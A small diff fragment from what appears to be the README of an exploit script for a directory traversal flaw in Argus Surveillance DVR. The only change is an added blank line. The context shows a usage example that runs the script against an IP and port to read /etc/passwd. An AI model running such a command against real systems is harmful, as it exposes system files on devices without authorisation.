@@ -35,6 +35,7 @@ This script exploits a directory traversal vulnerability in Argus Surveillance D
     - `<TARGET_FILEPATH>`: The file path you want to access on the target system.
 
 2. **Example:**
+
     For Unix
     ```sh
     python3 argus-dvr-traversal.py 192.168.1.100 8080 /etc/passwd
